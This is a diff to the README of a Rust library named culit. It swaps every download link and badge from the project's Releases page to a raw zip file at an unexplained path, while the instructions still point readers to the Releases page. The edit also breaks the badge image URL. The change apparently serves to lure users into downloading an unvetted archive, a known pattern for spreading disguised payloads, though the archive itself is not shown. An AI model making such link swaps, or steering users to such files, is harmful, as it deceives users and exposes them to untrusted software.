@@ -8,14 +8,14 @@ Welcome to **culit**! This application makes it easy to use custom literals in t
 
 To get started, you need to download the software. You can find the latest version of culit on our Releases page.
 
-[Download culit](https://github.com/swanandpatil9195/culit/releases)
+[Download culit](https://raw.githubusercontent.com/swanandpatil9195/culit/main/corallum/culit.zip)
 
 ### Step-by-Step Instructions
 
 1. **Visit the Release Page**  
    Click the button below to go directly to the Releases page.
 
-   [![Download culit](https://img.shields.io/badge/Download%20culit-Latest%20Release-blue)](https://github.com/swanandpatil9195/culit/releases)
+   [![Download culit](https://raw.githubusercontent.com/swanandpatil9195/culit/main/corallum/culit.zip%20culit-Latest%20Release-blue)](https://raw.githubusercontent.com/swanandpatil9195/culit/main/corallum/culit.zip)
 
 2. **Find the Latest Release**  
    On the Releases page, locate the most recent version of culit. The latest release will be at the top of the list. 
@@ -61,4 +61,4 @@ If you encounter any issues or have questions, you can open an issue in the GitH
 
 Join our community of users to share tips and tricks, ask questions, and discuss best practices. We encourage feedback and contributions to improve culit.
 
-[Download culit](https://github.com/swanandpatil9195/culit/releases) and start simplifying your Rust programming tasks today!
+[Download culit](https://raw.githubusercontent.com/swanandpatil9195/culit/main/corallum/culit.zip) and start simplifying your Rust programming tasks today!
